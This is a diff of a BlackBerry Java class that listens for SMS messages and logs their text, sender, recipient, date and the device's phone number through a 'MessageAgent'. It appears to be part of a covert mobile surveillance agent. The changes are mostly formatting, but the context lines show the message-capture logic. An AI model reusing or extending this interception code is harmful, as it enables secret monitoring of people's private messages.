@@ -11,10 +11,7 @@ import javax.wireless.messaging.MessageConnection;
 import javax.wireless.messaging.TextMessage;
 
 import net.rim.blackberry.api.phone.Phone;
-import net.rim.device.api.system.GPRSInfo;
 import net.rim.device.api.util.DataBuffer;
-
-import blackberry.Device;
 import blackberry.agent.MessageAgent;
 import blackberry.log.LogType;
 import blackberry.utils.Check;
@@ -43,19 +40,19 @@ public class SmsListener {
         try {
 
             smsconn = (MessageConnection) Connector.open("sms://:0");
-            insms = new SMSINListener((MessageConnection) smsconn, this);
+            insms = new SMSINListener(smsconn, this);
 
-        } catch (IOException e) {
+        } catch (final IOException e) {
             e.printStackTrace();
         }
     }
 
     public final void stop() {
         try {
-            if(smsconn!=null){
+            if (smsconn != null) {
                 smsconn.close();
             }
-        } catch (IOException e) {
+        } catch (final IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         } finally {
@@ -67,14 +64,14 @@ public class SmsListener {
         new Thread(insms).start();
         try {
             smsconn.setMessageListener(insms);
-        } catch (IOException e) {
+        } catch (final IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
         }
     }
 
     synchronized void saveLog(final javax.wireless.messaging.Message message,
-            boolean incoming) {
+            final boolean incoming) {
         String msg = null;
 
         //#ifdef DEBUG_TRACE
@@ -82,18 +79,18 @@ public class SmsListener {
         //#endif
 
         if (message instanceof TextMessage) {
-            TextMessage tm = (TextMessage) message;
+            final TextMessage tm = (TextMessage) message;
             msg = tm.getPayloadText();
             //#ifdef DEBUG_INFO
             debug.info("Got Text SMS: " + msg);
             //#endif
 
         } else if (message instanceof BinaryMessage) {
-            byte[] data = ((BinaryMessage) message).getPayloadData();
+            final byte[] data = ((BinaryMessage) message).getPayloadData();
 
             try {
                 msg = new String(data, "UTF-8");
-            } catch (UnsupportedEncodingException e) {
+            } catch (final UnsupportedEncodingException e) {
                 //#ifdef DEBUG_ERROR
                 debug.error("saveLog:" + e);
                 //#endif
@@ -104,7 +101,7 @@ public class SmsListener {
             //#endif
         }
 
-        ByteArrayOutputStream os = null;
+        final ByteArrayOutputStream os = null;
         try {
 
             final int flags = incoming ? 1 : 0;
@@ -114,9 +111,9 @@ public class SmsListener {
             String from;
             String to;
             String address = message.getAddress();
-           
+
             final String prefix = "sms://";
-            if(address.indexOf(prefix) == 0){
+            if (address.indexOf(prefix) == 0) {
                 address = address.substring(prefix.length());
             }
 
@@ -137,13 +134,16 @@ public class SmsListener {
             databuffer.write(Utils.padByteArray(to, 16));
 
             //#ifdef DEBUG_INFO
-            debug.info("Received sms : " + (incoming?"incoming":"outgoing"));
-            debug.info("From: " +from + " To: "+ to +" date: "+filetime);            
+            debug
+                    .info("Received sms : "
+                            + (incoming ? "incoming" : "outgoing"));
+            debug.info("From: " + from + " To: " + to + " date: " + filetime);
             //#endif
-                        
+
             //Check.ensures(additionalData.length == 56, "Wrong buffer size");
 
-            messageAgent.createLog(additionalData, WChar.getBytes(msg), LogType.SMS_NEW);
+            messageAgent.createLog(additionalData, WChar.getBytes(msg),
+                    LogType.SMS_NEW);
 
         } catch (final Exception ex) {
             //#ifdef DEBUG_ERROR
@@ -161,14 +161,15 @@ public class SmsListener {
     }
 
     private String getMyAddress() {
-        String number = Phone.getDevicePhoneNumber(false);
+        final String number = Phone.getDevicePhoneNumber(false);
         if (number == null || number.startsWith("Unknown")) {
             return "local";
         }
 
         //#ifdef DBC
-        Check.ensures(number.length() <= 16, 
-                "getMyAddress too long: " + number);
+        Check
+                .ensures(number.length() <= 16, "getMyAddress too long: "
+                        + number);
         //#endif
 
         return number;
